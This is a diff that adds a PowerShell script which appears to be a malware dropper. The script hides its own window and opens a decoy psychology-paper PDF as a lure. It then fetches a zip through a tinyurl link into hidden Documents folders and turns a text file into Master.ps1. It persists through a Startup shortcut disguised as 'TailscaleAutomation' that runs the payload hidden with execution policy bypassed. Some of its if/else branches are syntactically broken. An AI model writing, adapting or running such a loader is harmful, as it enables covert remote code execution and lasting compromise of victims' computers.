@@ -1,1 +1,104 @@
+$ProgressPreference = 'SilentlyContinue'
 
+function Test-SingleInstance {
+    param([string]$MutexName = "RUNNING")
+
+    $mutex = New-Object System.Threading.Mutex($false, $MutexName)
+    $acquired = $mutex.WaitOne(0)
+
+    return @{
+        Mutex = $mutex
+        Acquired = $acquired
+    }
+}
+
+$code = @"
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+"@
+$winApi = Add-Type -MemberDefinition $code -Name "Win32ShowWindow" -Namespace "Win32Functions" -PassThru
+$hwnd = (Get-Process -Id $PID).MainWindowHandle
+if ($hwnd -ne [System.IntPtr]::Zero) {
+    $winApi::ShowWindow($hwnd, 0)
+}
+
+if ($PNum -eq 1) {
+start-process "msedge.exe" -ArgumentList "https://nature-cursive.github.io/Psychology/CP-show-distinct-expertise-dependent-brain.pdf"
+} else ( $PNum - eq 2) {
+start-process "msedge.exe" -ArgumentList "https://nature-cursive.github.io/Psychology/Psychedelics-and-sexual-functioning.pdf"
+} else ($PNum - eq 3) {
+start-process "msedge.exe" -ArgumentList "https://nature-cursive.github.io/Psychology/Single-dose-creatine.pdf"
+} else ($PNum - eq 4) {
+start-process "msedge.exe" -ArgumentList "https://nature-cursive.github.io/Psychology/Young-adults-desired-life-trade-offs.pdf"
+} else ($PNum - eq 5) {
+start-process "msedge.exe" -ArgumentList "https://nature-cursive.github.io/Psychology/potential-of-generative-AI-for-persuasion-at-scale.pdf"
+} else ($PNum -eq 6) {
+start-process "msedge.exe" -ArgumentList "https://nature-cursive.github.io/Psychology/lower-connection-to-nature-is-related-to-lower-mental.pdf"
+}
+
+
+$instanceCheck = Test-SingleInstance -MutexName "Git_RUNNING"
+
+if (-not $instanceCheck.Acquired) {
+    exit 1
+}
+
+try {
+    $url = "https://tinyurl.com/$tinycode"
+    $Documents = "$env:USERPROFILE\Documents"
+    $destination = Join-Path $Documents "DataFile.zip"
+
+    $DataFilePath = "$Documents\DataFile"
+    if (-Not (Test-Path $DataFilePath)) {
+        New-Item -Path $DataFilePath -ItemType Directory -Force
+        Start-Sleep -Seconds 2
+        attrib +h $DataFilePath
+
+    }
+
+    $curl = Get-Command curl.exe -ErrorAction SilentlyContinue 
+    if ($curl) {
+        curl.exe -s -S -L --retry 10 --retry-delay 5 -o $destination $url
+    } else {
+        Invoke-WebRequest -Uri $url -OutFile $destination -ErrorAction Stop
+    }
+
+    Expand-Archive -Path $destination -DestinationPath $DataFilePath -Force
+
+    Start-Sleep -Seconds 5
+
+    Remove-Item $destination -Force
+
+    $codeFolder = "$Documents\CodeFile"
+    if (-Not (Test-Path $codeFolder)) {
+        New-Item -Path $codeFolder -ItemType Directory -Force
+        Start-Sleep -Seconds 2
+        attrib +h $codeFolder
+    }
+
+    $masterTxtPath = "$Documents\DataFile\Master.txt"
+    $masterPs1Path = Join-Path "$Documents\CodeFile" "Master.ps1"
+
+    Copy-Item -Path $masterTxtPath -Destination $masterPs1Path -Force
+
+
+    $startupFolder = [Environment]::GetFolderPath("Startup")
+    $shortcutPath = Join-Path $startupFolder "TailscaleAutomation.lnk"
+
+    if (-Not (Test-Path $shortcutPath)) {
+        $WshShell = New-Object -ComObject WScript.Shell
+        $shortcut = $WshShell.CreateShortcut($shortcutPath)
+
+        $shortcut.TargetPath = "powershell.exe"
+        $shortcut.Arguments = "-NoLogo -NoProfile -WindowStyle hidden -ExecutionPolicy Bypass -File `"$env:USERPROFILE\Documents\CodeFile\Master.ps1`""
+        $shortcut.Save()
+    }
+
+    Start-Process powershell.exe -ArgumentList "-NoLogo -NoProfile -WindowStyle hidden -ExecutionPolicy Bypass -File `"$env:USERPROFILE\Documents\CodeFile\Master.ps1`""
+
+} finally {
+    if ($instanceCheck.Acquired) {
+        $instanceCheck.Mutex.ReleaseMutex()
+    }
+    $instanceCheck.Mutex.Dispose()
+}
